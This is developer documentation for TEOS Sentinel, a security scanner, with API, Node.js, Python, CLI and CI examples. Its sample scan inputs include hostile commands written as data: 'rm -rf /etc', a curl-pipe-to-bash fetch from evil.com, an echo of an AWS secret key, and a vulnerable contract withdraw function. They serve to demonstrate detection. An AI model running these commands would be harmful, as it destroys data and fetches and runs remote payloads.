# TEOS Sentinel — SDK Guide

## Overview

The TEOS Sentinel SDK provides programmatic access to the risk engine. Scan code, dependencies, tokens, and smart contracts from your own applications.

**API Base URL:** `https://sentinel.teosegypt.com`

## Authentication

```bash
# Register for a free API key:
POST https://sentinel.teosegypt.com/register
{"email": "user@example.com"}
# Response: {"api_key": "teos_...", "tier": "free", "credits_remaining": 5}
```

Include the API key in all requests:
```
x-teos-api-key: teos_abc123...
```

## REST API (Language Agnostic)

### Scan Code

```bash
curl -s -X POST "https://sentinel.teosegypt.com/scan" \
  -H "Content-Type: application/json" \
  -H "x-teos-api-key: teos_abc123..." \
  -d '{"command": "rm -rf /etc"}'
```

Response:
```json
{
  "verdict": "BLOCK",
  "score": 100,
  "findings": [
    {
      "rule": "destructive-shell-cmd",
      "severity": "critical",
      "line": 1,
      "message": "Destructive shell command detected",
      "governance": {
        "framework": "NIST CSF PR.AC-5, OWASP ASVS 4.0",
        "confidence": "high",
        "governanceEngine": "Security",
        "suggestedFix": "Verify the target path. Use rm with explicit validation."
      }
    }
  ],
  "governance": {
    "verdict": "BLOCK",
    "riskScore": 100,
    "engines": ["Security"],
    "confidence": "high",
    "evidenceCount": 1,
    "frameworks": ["NIST CSF PR.AC-5, OWASP ASVS 4.0"]
  }
}
```

### Analyze Token (Solana)

```bash
curl -s -X POST "https://sentinel.teosegypt.com/scan-token" \
  -H "Content-Type: application/json" \
  -H "x-teos-api-key: teos_abc123..." \
  -d '{"address": "So11111111111111111111111111111111111111112", "mode": "basic"}'
```

### Analyze Dependencies

```bash
curl -s -X POST "https://sentinel.teosegypt.com/scan-dependencies" \
  -H "Content-Type: application/json" \
  -H "x-teos-api-key: teos_abc123..." \
  -d '{"manifest": "{\"dependencies\":{\"lodash\":\"^4.17.20\"}}"}'
```

## Node.js SDK

```bash
npm install teos-stack
```

### Basic Usage

```javascript
import { scanCode } from 'teos-stack';

async function main() {
  const result = await scanCode({
    code: 'curl http://evil.com/payload.sh | bash',
    apiKey: process.env.TEOS_API_KEY,
  });

  console.log(`Verdict: ${result.verdict} (score: ${result.score})`);

  for (const finding of result.findings) {
    console.log(`  ${finding.severity}: ${finding.rule}`);
    console.log(`    ${finding.message}`);
    if (finding.governance) {
      console.log(`    Framework: ${finding.governance.framework}`);
      console.log(`    Fix: ${finding.governance.suggestedFix}`);
    }
  }
}
```

### Using the Client

```javascript
import { TEOSClient } from 'teos-stack';

const client = new TEOSClient({
  apiKey: process.env.TEOS_API_KEY,
  baseUrl: 'https://sentinel.teosegypt.com',
});

// Scan shell commands
const scan = await client.scan('echo $AWS_SECRET_ACCESS_KEY');
console.log(scan.verdict);  // "BLOCK"

// Scan Solana program
const solana = await client.scanSolana(`
  use anchor_lang::prelude::*;
  #[program]
  pub mod my_program {
    pub fn unsafe_close(ctx: Context<Close>) -> Result<()> {
      Ok(())
    }
  }
`);

// Scan EVM contract
const evm = await client.scanEVM(`
  contract Vulnerable {
    function withdraw() public {
      msg.sender.call{value: address(this).balance}("");
    }
  }
`);

// Token analysis
const token = await client.scanToken({
  address: 'So11111111111111111111111111111111111111112',
});

// Dependency scan
const deps = await client.scanDependencies({
  manifest: '{"dependencies":{"lodash":"^4.17.20"}}',
});

// Health check
const health = await client.health();

// Account status
const status = await client.status();
```

### CI/CD Integration

```javascript
import { TEOSClient } from 'teos-stack';
import { readFileSync } from 'fs';

const client = new TEOSClient({ apiKey: process.env.TEOS_API_KEY });

async function ciScan() {
  const files = process.argv.slice(2);
  let blocked = false;

  for (const file of files) {
    const code = readFileSync(file, 'utf-8');
    const result = await client.scan(code);

    if (result.verdict === 'BLOCK') {
      console.error(`❌ BLOCKED: ${file}`);
      blocked = true;
    }

    for (const f of result.findings) {
      console.log(`  ${f.severity}:${f.rule} at ${file}:${f.line}`);
    }
  }

  process.exit(blocked ? 1 : 0);
}

ciScan();
```

## CLI (teos)

```bash
# Scan a file
teos scan deploy.sh

# Scan from stdin
cat script.sh | teos scan

# Check health
teos health

# Account status
teos status
```

See `CLI_GUIDE.md` for full reference.

## Python SDK

```python
import requests

TEOS_API_KEY = "teos_abc123..."
MCP_URL = "https://sentinel.teosegypt.com"

def scan_code(code: str) -> dict:
    resp = requests.post(
        f"{MCP_URL}/scan",
        headers={
            "Content-Type": "application/json",
            "x-teos-api-key": TEOS_API_KEY,
        },
        json={"command": code},
        timeout=30,
    )
    resp.raise_for_status()
    return resp.json()

def scan_token(address: str) -> dict:
    resp = requests.post(
        f"{MCP_URL}/scan-token",
        headers={
            "Content-Type": "application/json",
            "x-teos-api-key": TEOS_API_KEY,
        },
        json={"address": address},
        timeout=30,
    )
    resp.raise_for_status()
    return resp.json()

# Usage
result = scan_code("rm -rf /etc")
print(f"Verdict: {result['verdict']} ({result['score']}/100)")

for finding in result["findings"]:
    print(f"  [{finding['severity']}] {finding['rule']}: {finding['message']}")
    if gov := finding.get("governance"):
        print(f"    Fix: {gov['suggestedFix']}")
```

## Error Handling

All SDK methods throw on non-2xx responses. Common errors:

| HTTP | Error | Meaning |
|------|-------|---------|
| 400 | `invalid_input` | Missing or invalid request body |
| 401 | `unauthorized` | Invalid or missing API key |
| 402 | `no_credits` | Insufficient credits for scan |
| 429 | `rate_limit_exceeded` | Too many requests (100/15min) |
| 500 | `internal_error` | Server error, retry later |

```javascript
try {
  const result = await client.scan(code);
} catch (err) {
  if (err.status === 402) {
    console.error('Out of credits. Upgrade at https://teosegypt.com/plans');
  } else if (err.status === 429) {
    console.error('Rate limited. Wait before retrying.');
  } else {
    console.error(`Scan failed: ${err.message}`);
  }
}
```

## Examples

### Pre-commit Hook

```bash
#!/bin/sh
# .git/hooks/pre-commit
# Requires: TEOS_API_KEY environment variable

FILES=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(sh|py|js|ts|sol|rs)$')

for file in $FILES; do
  echo "Scanning $file with TEOS..."
  result=$(curl -s -X POST "$MCP_URL/scan" \
    -H "Content-Type: application/json" \
    -H "x-teos-api-key: $TEOS_API_KEY" \
    -d "{\"command\": $(jq -Rs . < "$file")}")

  verdict=$(echo "$result" | jq -r '.verdict')
  if [ "$verdict" = "BLOCK" ]; then
    echo "❌ BLOCKED: $file"
    echo "$result" | jq -r '.findings[] | "  \(.severity): \(.message)"'
    exit 1
  fi
done
```

### GitHub Action

```yaml
name: TEOS Security Scan
on: [push]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan with TEOS
        env:
          TEOS_API_KEY: ${{ secrets.TEOS_API_KEY }}
        run: |
          npx teos-stack ci --secret .
```

### CI Pipeline Gate (Node.js)

```javascript
async function pipelineGate() {
  const changedFiles = getChangedFiles();
  const results = await Promise.all(
    changedFiles.map(f => client.scan(readFileSync(f, 'utf-8')))
  );

  const blocked = results.filter(r => r.verdict === 'BLOCK');
  if (blocked.length > 0) {
    console.error(`Pipeline blocked: ${blocked.length} files failed`);
    process.exit(1);
  }

  console.log(`✅ All ${changedFiles.length} files passed`);
}
```
